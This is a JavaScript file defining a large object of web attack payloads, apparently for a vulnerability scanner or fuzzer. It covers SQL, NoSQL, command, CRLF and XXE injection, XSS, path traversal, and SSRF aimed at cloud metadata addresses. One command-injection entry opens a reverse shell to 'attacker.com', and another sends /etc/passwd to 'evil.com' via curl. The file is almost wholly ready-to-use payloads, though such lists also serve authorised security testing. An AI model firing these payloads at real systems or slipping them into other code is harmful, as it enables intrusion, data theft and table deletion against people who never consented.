const PAYLOADS = {
  sql: {
    error_based: [
      "'", "''", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1",
      "1' AND '1'='2", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
      "'; DROP TABLE users--", "' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'",
      "1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE SLEEP(5))--"
    ],
    boolean_based: [
      "' AND '1'='1", "' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
      "' OR '1'='1'--", "' OR '1'='2'--"
    ],
    time_based: [
      "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ]
  },
  xss: {
    reflected: [
      "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
      "'><script>alert(1)</script>", "</script><script>alert(1)</script>",
      "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>"
    ],
    dom_based: [
      "\"><img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
      "{{constructor.constructor('alert(1)')()}}", "${alert(1)}"
    ],
    blind: [
      "<script src='https://collaborator.com/xss.js'></script>",
      "<img src='https://collaborator.com/xss.png'>"
    ]
  },
  command: {
    linux: [
      "; ls", "| cat /etc/passwd", "|| whoami", "& id", "&& uname -a",
      "$(pwd)", "`pwd`", "; nc -e /bin/sh attacker.com 4444",
      "| curl http://evil.com/steal?data=`cat /etc/passwd`"
    ],
    windows: [
      "; dir", "| type C:\\Windows\\win.ini", "& whoami", "&& ipconfig",
      "| powershell -c \"Get-ChildItem\""
    ],
    bypass: [
      "cAt /Etc/PaSsWd", "c\"a\"t /etc/passwd", "ca$()t /etc/passwd",
      "${IFS}cat${IFS}/etc/passwd"
    ]
  },
  path: {
    linux: [
      "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
      "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd"
    ],
    windows: [
      "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
      "..\\..\\..\\boot.ini", "....\\....\\....\\windows\\win.ini"
    ]
  },
  ssrf: {
    cloud_metadata: [
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://100.100.100.200/latest/meta-data/"
    ],
    internal: [
      "http://localhost:80", "http://localhost:8080", "http://127.0.0.1:22",
      "http://127.0.0.1:3306", "http://internal-admin.local/"
    ],
    file: [
      "file:///etc/passwd", "file:///c:/windows/win.ini",
      "gopher://localhost:8080", "dict://localhost:11211"
    ]
  },
  nosql: {
    operators: [
      '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$or": []}',
      '{"$where": "1==1"}', '{"$ne": ""}', '{"$exists": true}'
    ],
    string: [
      "admin' && this.password.match(/.*/)//",
      "username[$ne]=null&password[$ne]=null"
    ]
  },
  header: {
    crlf: [
      "test\r\nX-Injected: true", "test\nX-Injected: true",
      "%0d%0aX-Injected:%20true", "test%0d%0aSet-Cookie:%20injected=1"
    ],
    host: ["evil.com", "localhost:8080", "127.0.0.1", "169.254.169.254"],
    xss: ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd"]
  },
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
  ],
  graphql: [
    '{__typename}',
    '{users{password}}',
    'query {__typename}',
    'query {users{id username password}}',
    'mutation {__typename}',
    '{__schema{types{name fields{name}}}}'
  ],
  soap: [
    '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><id>1</id></GetUser></soap:Body></soap:Envelope>',
    '<?xml version="1.0"?><soap:Envelope><soap:Body><Union>SELECT * FROM users</Union></soap:Body></soap:Envelope>',
    '<soap:Envelope><soap:Body><Login><username>admin\' OR \'1\'=\'1</username><password>anything</password></Login></soap:Body></soap:Envelope>'
  ],
  large: {
    strings: [
      'A'.repeat(10000), 'B'.repeat(20000), '%00'.repeat(5000),
      '🔥'.repeat(3000), 'A'.repeat(10000) + '../'.repeat(1000)
    ],
    numbers: ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity']
  }
};